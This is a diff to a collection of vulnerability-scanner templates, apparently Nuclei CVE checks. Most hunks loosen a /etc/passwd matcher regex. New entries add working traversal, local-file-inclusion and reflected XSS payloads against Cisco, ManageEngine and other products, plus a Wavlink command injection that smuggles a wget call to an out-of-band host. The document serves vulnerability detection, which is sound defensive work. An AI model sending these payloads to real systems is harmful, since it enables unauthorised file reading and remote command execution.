@@ -56,7 +56,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -139,7 +139,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -167,7 +167,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -201,7 +201,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -228,7 +228,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -342,7 +342,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -413,7 +413,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -448,7 +448,7 @@
             {
               "condition": "and",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -482,7 +482,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -497,6 +497,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2011-3315",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in Cisco Unified Communications Manager (CUCM) 5.x and 6.x before 6.1(5)SU2, 7.x before 7.1(5b)SU2, and 8.x before 8.0(3), and Cisco Unified Contact Center Express (aka Unified CCX or UCCX) and Cisco Unified IP Interactive Voice Response (Unified IP-IVR) before 6.0(1)SR1ES8, 7.0(x) before 7.0(2)ES1, 8.0(x) through 8.0(2)SU3, and 8.5(x) before 8.5(1)SU2, allows remote attackers to read arbitrary files via a crafted URL, aka Bug IDs CSCth09343 and CSCts44049.",
+        "name": "Cisco CUCM, UCCX, and Unified IP-IVR- Directory Traversal",
+        "reference": "https://www.exploit-db.com/exploits/36256",
+        "severity": "high",
+        "tags": "cve,cve2011,lfi,cisco"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -852,7 +886,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -929,7 +963,7 @@
             {
               "condition": "and",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -1220,6 +1254,48 @@
       ]
     },
     {
+      "id": "CVE-2012-4889",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple cross-site scripting (XSS) vulnerabilities in ManageEngine Firewall Analyzer 7.2 allow remote attackers to inject arbitrary web script or HTML via the (1) subTab or (2) tab parameter to createAnomaly.do; (3) url, (4) subTab, or (5) tab parameter to mindex.do; (6) tab parameter to index2.do; or (7) port parameter to syslogViewer.do.",
+        "name": "ManageEngine Firewall Analyzer 7.2 - Reflected Cross Site Scripting (XSS)",
+        "reference": "- https://www.securityfocus.com/bid/52841/info\n- https://nvd.nist.gov/vuln/detail/CVE-2012-4889\n",
+        "severity": "medium",
+        "tags": "cve,cve2012,xss,manageengine"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/fw/syslogViewer.do?port=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-5913",
       "info": {
         "author": "daffainfo",
@@ -1280,7 +1356,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -1585,6 +1661,40 @@
       ]
     },
     {
+      "id": "CVE-2013-5528",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Tomcat administrative web interface in Cisco Unified Communications Manager allows remote authenticated users to read arbitrary files via directory traversal sequences in an unspecified input string, aka Bug ID CSCui78815",
+        "name": "Cisco Unified Communications Manager 7/8/9 - Directory Traversal",
+        "reference": "https://www.exploit-db.com/exploits/40887",
+        "severity": "high",
+        "tags": "cve,cve2013,lfi,cisco"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-2321",
       "info": {
         "author": "geeknik",
@@ -1686,7 +1796,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -1763,7 +1873,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -1882,7 +1992,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -1958,7 +2068,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[0*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -2000,7 +2110,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -2161,7 +2271,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -2197,7 +2307,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -2393,7 +2503,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[0*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -2936,7 +3046,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[0*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -3014,7 +3124,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -3261,7 +3371,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             }
@@ -3403,7 +3513,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -3448,7 +3558,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -3632,7 +3742,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -3672,7 +3782,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -3706,7 +3816,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -3802,7 +3912,7 @@
               "conditon": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "\\[(font|extension|file)s\\]"
               ],
               "type": "regex"
@@ -3834,7 +3944,7 @@
               "condition": "and",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -4653,7 +4763,7 @@
             {
               "condition": "and",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -5143,7 +5253,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -5207,7 +5317,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[0*]:0:0",
+                "root:.*:0:0",
                 "\\[(font|extension|file)s\\]"
               ],
               "type": "regex"
@@ -5311,7 +5421,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -5425,7 +5535,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "\\[(font|extension|file)s\\]"
               ],
               "type": "regex"
@@ -5614,7 +5724,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -5642,7 +5752,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -5676,7 +5786,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -5702,7 +5812,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -5892,7 +6002,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -5918,7 +6028,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -6126,7 +6236,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -6166,7 +6276,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -6562,7 +6672,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -6601,7 +6711,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -6836,7 +6946,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -6870,7 +6980,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -6905,7 +7015,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -7007,7 +7117,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -7431,7 +7541,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -7595,7 +7705,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -8090,7 +8200,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -8336,7 +8446,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -8486,7 +8596,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -8548,7 +8658,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "\\[(font|extension|file)s\\]"
               ],
               "type": "regex"
@@ -8585,7 +8695,7 @@
             {
               "condition": "and",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -8704,7 +8814,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -9372,7 +9482,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -9469,7 +9579,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -9639,7 +9749,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -9680,7 +9790,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -9958,7 +10068,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -10026,7 +10136,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -10060,7 +10170,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             }
@@ -10540,7 +10650,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "define\\('DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)'"
               ],
               "type": "regex"
@@ -10735,7 +10845,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -10861,6 +10971,35 @@
           ],
           "raw": [
             "POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: keep-alive\nX-Requested-With: XMLHttpRequest\nContent-Length: 218\nContent-Type: application/x-www-form-urlencoded\n\nnodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-13117",
+      "info": {
+        "author": "gy741",
+        "description": "Several Wavlink products are affected by a vulnerability that may allow remote unauthenticated users to execute arbitrary commands as root on Wavlink devices. The user input is not properly sanitized which allows command injection via the \"key\" parameter in a login request. It has been tested on Wavlink WN575A4 and WN579X3 devices, but other products may be affected.",
+        "name": "Wavlink Multiple AP - Unauthenticated RCE",
+        "reference": [
+          "https://blog.0xlabs.com/2021/02/wavlink-rce-CVE-2020-13117.html"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2020,wavlink,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi-bin/login.cgi HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://{{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nConnection: close\n\nnewUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2F{{interactsh-url}}%3B%60%3B%23&password=asd&lang_select=en\n"
           ]
         }
       ]
@@ -11298,7 +11437,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             }
@@ -11329,7 +11468,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "\\[(font|extension|file)s\\]"
               ],
               "type": "regex"
@@ -11375,7 +11514,7 @@
             {
               "condition": "and",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -11483,7 +11622,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -11594,7 +11733,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -11635,7 +11774,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -11886,7 +12025,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -12052,7 +12191,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -12081,7 +12220,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -12314,7 +12453,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -12728,7 +12867,7 @@
               "condition": "or",
               "regex": [
                 "nobody:[x*]:65534:65534",
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             }
@@ -12955,7 +13094,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -12992,7 +13131,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -13376,6 +13515,41 @@
       ]
     },
     {
+      "id": "CVE-2020-29227",
+      "info": {
+        "author": "daffainfo",
+        "description": "An issue was discovered in Car Rental Management System 1.0. An unauthenticated user can perform a file inclusion attack against the /index.php file with a partial filename in the \"page\" parameter, to cause local file inclusion resulting in code execution.",
+        "name": "Car Rental Management System 1.0 - Local File Inclusion (LFI)",
+        "reference": "- https://loopspell.medium.com/cve-2020-29227-unauthenticated-local-file-inclusion-7d3bd2c5c6a5\n- https://nvd.nist.gov/vuln/detail/CVE-2020-29227\n",
+        "severity": "high",
+        "tags": "cve,cve2020,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?page=/etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-29395",
       "info": {
         "author": "daffainfo",
@@ -13690,7 +13864,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -14080,7 +14254,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -14115,7 +14289,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -14300,7 +14474,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "BIG-IP release ([\\d.]+)",
                 "[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{7}",
                 "HSQL Database Engine Servlet"
@@ -14435,7 +14609,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -14709,7 +14883,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -14794,7 +14968,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -14868,7 +15042,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -14949,7 +15123,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             },
@@ -15138,7 +15312,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -15578,7 +15752,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -16255,7 +16429,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[0*]:0:0"
+                "root:.*:0:0"
               ],
               "type": "regex"
             },
@@ -16967,7 +17141,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -17565,7 +17739,7 @@
             {
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "sshd:[x*]",
                 "root:[$]"
               ],
@@ -18314,7 +18488,7 @@
           "matchers": [
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -18348,7 +18522,7 @@
               "condition": "or",
               "part": "body",
               "regex": [
-                "root:[x*]:0:0:",
+                "root:.*:0:0:",
                 "daemon:[x*]:0:0:",
                 "operator:[x*]:0:0:"
               ],
@@ -18410,7 +18584,7 @@
             },
             {
               "regex": [
-                "root:[x*]:0:0:"
+                "root:.*:0:0:"
               ],
               "type": "regex"
             }
@@ -18547,11 +18721,11 @@
             }
           ],
           "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/%u002e/WEB-INF/web.xml",
-            "{{BaseURL}}/.%00/WEB-INF/web.xml"
-          ]
+          "raw": [
+            "GET /%u002e/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\n",
+            "GET /.%00/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\n\n"
+          ],
+          "unsafe": true
         }
       ]
     },
